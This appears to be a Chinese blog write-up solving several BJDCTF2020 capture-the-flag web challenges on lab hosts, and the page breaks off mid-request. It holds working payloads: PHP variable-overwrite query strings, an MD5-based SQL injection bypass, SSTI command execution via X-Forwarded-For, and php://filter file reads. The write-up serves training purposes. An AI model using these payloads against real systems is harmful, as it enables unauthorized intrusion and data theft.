<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="刷"><title>BJDCTF2020</title><link rel=canonical href=https://baozongwi.github.io/p/bjdctf2020/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="BJDCTF2020"><meta property='og:description' content="刷"><meta property='og:url' content='https://baozongwi.github.io/p/bjdctf2020/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:published_time' content='2024-08-11T21:04:04+00:00'><meta property='article:modified_time' content='2024-08-11T21:04:04+00:00'><meta name=twitter:title content="BJDCTF2020"><meta name=twitter:description content="刷"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%A4%8D%E7%8E%B0/>复现</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/bjdctf2020/>BJDCTF2020</a></h2><h3 class=article-subtitle>刷</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Aug 11, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><h1 id=bjdctf2020mark-loves-cat>[BJDCTF2020]Mark loves cat</h1><p>进去之后是一个网页,怀疑是<code>git</code>泄露,因为挺多这样拿源码的而且题目是个<code>cat</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python GitHack.py http://a2ea6e9a-3c74-4806-be7c-911267a2c810.node5.buuoj.cn:81/.git
</span></span></code></pre></td></tr></table></div></div><p><code>flag.php</code>是一个普通的开文件的没啥用,源码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$yds</span> <span class=o>=</span> <span class=s2>&#34;dog&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$is</span> <span class=o>=</span> <span class=s2>&#34;cat&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$handsome</span> <span class=o>=</span> <span class=s1>&#39;yds&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_POST</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$x</span> <span class=o>&amp;&amp;</span> <span class=nv>$x</span> <span class=o>!==</span> <span class=s1>&#39;flag&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=nv>$handsome</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=nv>$yds</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;flag&#39;</span>  <span class=o>||</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;flag&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=nv>$is</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;the flag is: &#34;</span><span class=o>.</span><span class=nv>$flag</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>一个变量覆盖吧,<code>exit(flag)</code>就可以得到<code>flag</code></p><p>但是深究其特性,我们还是起环境来实验吧</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_POST</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nv>$$x</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>//POST :age=15&amp;passwd=20&amp;w=10
</span></span></span><span class=line><span class=cl><span class=err>//string(2) &#34;10&#34;
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>//GET:x=y   一个嵌套的赋值
</span></span></span><span class=line><span class=cl><span class=c1>//$x=$y 
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$x</span> <span class=o>&amp;&amp;</span> <span class=nv>$x</span> <span class=o>!==</span> <span class=s1>&#39;flag&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=nv>$handsome</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>//这个可以赋值绕过
</span></span></span></code></pre></td></tr></table></div></div><p>欧克那么上payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?handsome=flag&amp;flag=a&amp;a=flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?yds=flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?is=flag&amp;flag=flag
</span></span></code></pre></td></tr></table></div></div><h1 id=bjdctf2020easy-md5>[BJDCTF2020]Easy MD5</h1><p>抓包发现<code>hint</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hint: select * from &#39;admin&#39; where password=md5($pass,true)
</span></span></code></pre></td></tr></table></div></div><p>实验发现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=k>or</span><span class=s1>&#39;1abcdefg&#39;</span><span class=w>    </span><span class=c1>---&gt;  True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=k>or</span><span class=s1>&#39;0abcdefg&#39;</span><span class=w>    </span><span class=c1>---&gt;  False
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=k>or</span><span class=s1>&#39;1&#39;</span><span class=w>           </span><span class=c1>---&gt;  True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=k>or</span><span class=s1>&#39;2&#39;</span><span class=w>           </span><span class=c1>---&gt;  True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=k>or</span><span class=s1>&#39;0&#39;</span><span class=w>           </span><span class=c1>---&gt;  False
</span></span></span></code></pre></td></tr></table></div></div><p>那么这里有个很经典的姿势就是<code>ffifdyop</code>绕过</p><p>这里也引入一个爆破脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;;)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=k>for</span> <span class=p>(</span><span class=nv>$c</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$c</span> <span class=o>&lt;</span> <span class=mi>1000000</span><span class=p>;</span> <span class=nv>$c</span><span class=o>++</span><span class=p>,</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$i</span><span class=p>,</span> <span class=k>true</span><span class=p>),</span> <span class=s1>&#39;\&#39;or\&#39;&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>md5(</span><span class=si>$i</span><span class=s2>) = &#34;</span> <span class=o>.</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$i</span><span class=p>,</span> <span class=k>true</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=k>echo</span> <span class=s2>&#34;.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>绕过这层之后进入下一层</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>$a = $GET[&#39;a&#39;];
</span></span></span><span class=line><span class=cl><span class=c>$b = $_GET[&#39;b&#39;];
</span></span></span><span class=line><span class=cl><span class=c>
</span></span></span><span class=line><span class=cl><span class=c>if($a != $b &amp;&amp; md5($a) == md5($b)){
</span></span></span><span class=line><span class=cl><span class=c>    // wow, glzjin wants a girl friend.
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?a[]=1&amp;b[]=2
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s2>&#34;flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;param1&#39;</span><span class=p>]</span><span class=o>!==</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;param2&#39;</span><span class=p>]</span><span class=o>&amp;&amp;</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;param1&#39;</span><span class=p>])</span><span class=o>===</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;param2&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>到这里我直接传参竟然过不去了,后来发现是<code>url</code>的问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://55379fcc-71e8-4ff1-9e37-ec8c41bfbd3e.node5.buuoj.cn:81/levell14.php
</span></span><span class=line><span class=cl>POST:
</span></span><span class=line><span class=cl>param1[]=1&amp;param2[]=2
</span></span></code></pre></td></tr></table></div></div><h1 id=bjdctf2020the-mystery-of-ip>[BJDCTF2020]The mystery of ip</h1><p>进来之后发现<code>IP</code>可控</p><p>然后就慢慢试就可以了,最后发现是<code>ssti</code></p><p>尝试了一下<code>jinja</code>的RCE,发现把<code>.</code>过滤了</p><p>然后就直接执行了,没想到成功了,但是有点不适应的是,当前目录有个假<code>flag</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>X-Forwarded-For:{{system(&#34;ls /&#34;)}}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>X-Forwarded-For:{{system(&#34;nl /f*&#34;)}}
</span></span></code></pre></td></tr></table></div></div><h1 id=bjdctf2020zjctf不过如此>[BJDCTF2020]ZJCTF，不过如此</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$text</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;text&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$text</span><span class=p>)</span><span class=o>&amp;&amp;</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$text</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span><span class=o>===</span><span class=s2>&#34;I have a dream&#34;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span class=o>.</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$text</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/flag/&#34;</span><span class=p>,</span><span class=nv>$file</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Not now!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>include</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>  <span class=c1>//next.php
</span></span></span><span class=line><span class=cl><span class=c1></span>    
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>如果用<code>php://input</code>协议的话确实是需要bp发包了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 9e7f59cc-c72f-4520-8e03-fe9eb68fad3e.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Length: 14
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
